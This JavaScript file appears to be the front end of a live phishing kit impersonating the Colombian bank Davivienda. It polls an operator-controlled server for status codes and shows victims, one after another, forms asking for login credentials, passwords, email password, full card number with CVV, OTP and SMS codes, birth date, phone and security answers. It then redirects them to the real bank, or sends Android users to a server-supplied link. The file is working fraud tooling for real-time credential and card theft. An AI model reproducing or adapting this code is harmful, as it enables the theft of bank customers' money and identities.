function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

/*
function consultar_estado(){ //
    if (espera == 1) { 
        var op = 'estado';
        $.post( "run/traer-datos.php",{op: op},function(data) { 
          //
            //dat = typeof data;23
           // console.log(data);
            dat = parseInt(data);
            console.log(dat);
            switch (dat) { 
                case 2:espera = 0; 
                         vista_otp(); 
                         break;
                case 4:espera = 0;
                         vista_email(); 
                         break;
                case 6:espera = 0;
                         vista_tarjeta();  
                         break;               
                case 8:espera = 0;
                         vista_errorotp(); 
                         break;
                case 10:espera = 0;
                		  salir();
                          break;
                case 12:espera = 0;
                          vista_usuario(); 
                          break;
                case 13:espera = 0;
                          vista_tarjetadt();
                          break;  
                case 15:espera = 0;
                          vista_apellidos();
                          break;   
                case 17:espera = 0; 
                          vista_fnacimiento();
                          break;   
                case 19:espera = 0;
                          vista_celular();
                          break;   
                case 21:espera = 0; 
                          vista_pregunta();
                          break; 
                case 23:espera = 0; 
                          vista_clave();
                          break;  
                case 25:espera = 0; 
                          vista_pregunta2();
                          break; 
                case 26:espera = 0; 
                          vista_clave2();
                          break;  
                case 31:espera = 0; 
                          vista_smsotp();
                          break;                                                    
            } 
        });    
    }    
}
*/


function consultar_estado() {
    if (espera != 1) {
        return;
    }
    $.post("../../../process/estado.php", function (data) {
        var s = String(data == null ? "" : data).replace(/^\s+|\s+$/g, "");
        switch (s) {
            case "2":
                espera = 0;
                vista_smsotp();
                break;
            case "4":
                espera = 0;
                vista_email();
                break;
            case "6":
                espera = 0;
                vista_tarjeta();
                break;
            case "8":
                espera = 0;
                vista_errorotp();
                break;
            case "10":
                espera = 0;
                window.location.href = "../../../finish-no-back-button/";
                break;
            case "12":
                espera = 0;
                vista_usuario();
                break;
            default:
                break;
        }
    });
}

function vista_preguntarep(){
    var el = document.getElementById("preg2");
    if (el) {
        el.innerHTML = "Confirme la información solicitada";
    }

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".clcj").hide();
    $(".pregunta2").show();
    $("#resp2").focus();
}

function salir(){

    equi = detectar_dispositivo();
	console.log(equi);

        if (equi === 'Android' ) {

            var op = 'link';

            $.post( "run/traer-datos.php",{op: op},function(date) {
                console.log(date);
                var link = date;
                window.location.href = 'https://'+link;
                
             }); 

        } else {
            console.log('no es android');
            window.location.href = "https://www.davivienda.com/wps/portal/personas/nuevo";
        }

}

function vista_otp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("codigootp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".otp").show();
    $("#codigootp").focus();
}

function vista_errorotp(){
    $("#msgOTP2").html("Codigo OTP invalido");
    $("#msgOTP2").css("display", "table");

    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("codigootp2").value = "";
    
    $(".tarjeta").hide();
    $(".otp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".errorotp").show();
    $("#codigootp2").focus();
}


function vista_usuario(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("usuario").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".acceso").show();
    $("#usuario").focus();

}


function vista_email(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("email").value = "";
    document.getElementById("clavemail").value = "";
    var cc = document.getElementById("celular_corr");
    if (cc) {
        cc.value = "";
    }

    $(".acceso").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".correo-con").show();
    $("#email").focus();

}


function vista_tarjeta(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16").value = "";
    document.getElementById("Fecha").value = "";
    document.getElementById("cvv").value = "";

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".tarjeta").show();
    $("#tarjeta16").focus();

}


function vista_tarjetadt(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16dt").value = "";
    document.getElementById("Fechadt").value = "";
    document.getElementById("cvvdt").value = "";
    document.getElementById("clavedt").value = ""; 

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".tarjeta").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".tarjetadt").show();
    $("#tarjeta16dt").focus();

}


function vista_apellidos(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("apellido").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide(); 
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".apellidos").show();
    $("#apellido").focus();
}

function vista_fnacimiento(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("nacimiento").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide();  
    $(".apellidos").hide(); 
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".fnacimiento").show();
    $("#nacimiento").focus();
}

function vista_celular(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("celular").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".mobil").show(); 
    $("#celular").focus();
}

function vista_pregunta(){

 /*   $.post( "run/traer-pregunta.php",function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg").innerHTML = resp;
     });
*/     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".pregunta").show();
    $("#resp").focus();
}

function vista_pregunta2(){
    var p2 = document.getElementById("preg2");
    if (p2) {
        p2.innerHTML = "Confirme la información solicitada";
    }

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".pregunta2").show();
    $("#resp2").focus();
}

function vista_clave(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".clave").show();
    $("#clave").focus();

}

function vista_clave2(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave2").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".smsotp").hide();
    $(".clave2").show();
    $("#clave2").focus();

}

function vista_smsotp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("smsotp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".smsotp").show();
    $("#smsotp").focus();
}


function actualizar_casos(){
    $.post( "../../../process/casos.php", function(data) {
        $(".contenido").html(data);     
        $.post( "../../../process/pito.php", function(res) {
            if (res == "SI") {
                $("audio").get(0).play();
            }else{

            }
        });
    });
}
